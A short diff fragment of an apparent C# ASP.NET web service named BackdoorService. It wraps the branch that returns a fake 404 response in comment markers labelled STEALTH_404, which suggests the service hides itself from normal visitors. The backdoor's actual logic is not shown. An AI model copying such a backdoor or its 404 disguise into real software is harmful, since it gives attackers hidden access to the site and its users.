@@ -45,8 +45,10 @@ public class BackdoorService : System.Web.Services.WebService {
             
             context.ApplicationInstance.CompleteRequest();
         } else {
+            /* [STEALTH_404_START]
             response.StatusCode = 404;
         	response.End();
+            [STEALTH_404_END] */
         }
     }
 }
